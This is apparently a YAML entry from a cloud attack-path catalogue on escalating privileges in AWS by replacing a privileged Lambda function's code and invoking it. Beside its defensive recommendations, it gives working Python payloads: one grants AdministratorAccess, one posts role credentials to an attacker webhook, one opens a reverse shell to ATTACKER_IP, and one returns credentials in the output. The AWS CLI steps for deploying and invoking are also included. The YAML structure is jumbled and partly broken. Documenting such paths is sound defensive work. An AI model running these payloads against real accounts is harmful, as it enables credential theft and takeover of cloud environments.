description: A principal with `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` can modify the code of an existing Lambda function that has a privileged execution role and then manually invoke it. By replacing the function code with malicious code and invoking it, the attacker can execute arbitrary commands with the privileges of the function's execution role immediately, without waiting for automatic triggers.
prerequisites:
  admin:
  - A Lambda function must exist with an administrative execution role (e.g., AdministratorAccess)
  lateral:
  - A Lambda function must exist with a privileged execution role

    command: aws lambda invoke --function-name TARGET_FUNCTION output.txt
    description: Manually invoke the function to execute the privilege escalation
recommendation: |
  Restrict the `lambda:UpdateFunctionCode` permission using the principle of least privilege.
  Use resource-based policies to limit which functions can be modified:

  ```json
  {
    "Effect": "Allow",
    "Action": "lambda:UpdateFunctionCode",
    "Resource": "arn:aws:lambda:REGION:ACCOUNT_ID:function/SpecificFunction"
  }
  ```

  Additional controls:
  - Monitor CloudTrail for `UpdateFunctionCode` events on sensitive functions
  - Implement Lambda function versioning and aliases to prevent direct modification
  - Use AWS Config rules to detect changes to Lambda function code
  - Require code signing for Lambda deployments
  - Alert on Lambda functions with privileged roles being modified
limitations: 'This path provides administrative access only if the target resource''s execution role has administrative permissions. The attacker gains whatever permissions the resource''s role has. If the role has limited permissions, the attacker gains limited access. However, even limited access may enable multi-hop attacks or access to sensitive data.

  - id: method_sdk_attack
    label: 'Method 1: Execute Attack via AWS SDK'
    type: payload
    color: '#99ccff'
    description: |
      The malicious Lambda function code uses the AWS SDK to directly perform privileged actions using the execution role's credentials. The function can call IAM APIs to elevate the starting principal's permissions, create access keys, modify policies, or perform other administrative actions. Since the function runs with the execution role's credentials automatically available, no credential exfiltration is needed.

      Example malicious Lambda code:
      ```python
      import boto3

      def lambda_handler(event, context):
          iam = boto3.client('iam')
          # Attach admin policy to starting user
          iam.attach_user_policy(
              UserName='attacker-user',
              PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
          )
          return {'statusCode': 200, 'body': 'Privilege escalation complete'}
      ```

      This is the most direct approach - the Lambda function immediately modifies IAM or performs other privileged actions using its execution role's permissions.
  - id: method_webhook_exfil
    label: 'Method 2: Exfiltrate Credentials to Webhook'
    type: payload
    color: '#99ccff'
    description: |
      The malicious Lambda function code retrieves the execution role's temporary credentials from the Lambda environment and exfiltrates them to an attacker-controlled webhook or HTTP endpoint. The credentials are automatically available in environment variables that the AWS SDK uses.

      Example malicious Lambda code:
      ```python
      import os
      import json
      import urllib.request

      def lambda_handler(event, context):
          # Get credentials from environment
          creds = {
              'access_key': os.environ['AWS_ACCESS_KEY_ID'],
              'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],
              'session_token': os.environ['AWS_SESSION_TOKEN']
          }

          # Exfiltrate to webhook
          req = urllib.request.Request(
              'https://attacker-webhook.com/collect',
              data=json.dumps(creds).encode(),
              headers={'Content-Type': 'application/json'}
          )
          urllib.request.urlopen(req)

          return {'statusCode': 200}
      ```

      The attacker receives the credentials remotely and can use them from any location until they expire (typically 15 minutes to 1 hour).
  - id: method_reverse_shell
    label: 'Method 3: Reverse Shell Connection'
    type: payload
    color: '#99ccff'
    description: |
      The malicious Lambda function establishes a reverse shell connection back to an attacker-controlled listener, providing interactive access. From within the reverse shell, the attacker can access the execution role's credentials and run arbitrary AWS CLI commands.

      Example malicious Lambda code:
      ```python
      import socket
      import subprocess
      import os

      def lambda_handler(event, context):
          # Establish reverse shell
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect(('ATTACKER_IP', 4444))

          # Redirect stdin/stdout/stderr to socket
          os.dup2(s.fileno(), 0)
          os.dup2(s.fileno(), 1)
          os.dup2(s.fileno(), 2)

          # Start shell
          subprocess.call(['/bin/sh', '-i'])

          return {'statusCode': 200}
      ```

      This provides an interactive shell session within the Lambda execution environment where the attacker can access credentials and execute AWS CLI commands with the execution role's permissions. The session lasts until the Lambda function times out (max 15 minutes).

    label: 'Method 4: Exfiltrate Credentials to Output'
    type: payload
    color: '#99ccff'
    description: |
      The malicious Lambda function code retrieves the execution role's temporary credentials from the Lambda environment and returns them in the function's response output. This allows the attacker to read the credentials directly from the Lambda invocation result without needing an external webhook or reverse shell.

      Example malicious Lambda code:
      ```python
      import os
      import json

      def lambda_handler(event, context):
          # Get credentials from environment
          creds = {
              'access_key': os.environ['AWS_ACCESS_KEY_ID'],
              'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],
              'session_token': os.environ['AWS_SESSION_TOKEN']
          }

          # Return credentials in the response
          return {
              'statusCode': 200,
              'body': json.dumps({
                  'message': 'Credentials exfiltrated',
                  'credentials': creds
              })
          }
      ```

      The attacker invokes the function and reads the credentials from the response output. These credentials can then be exported and used from any location until they expire (typically 15 minutes to 1 hour).

      The attacker updates the target Lambda function's code with malicious code. This requires creating a deployment package (ZIP file) containing the malicious code and uploading it to replace the function's existing code.

      Commands:

      aws lambda update-function-code \
        --function-name TARGET_FUNCTION \
        --zip-file fileb://exploit.zip
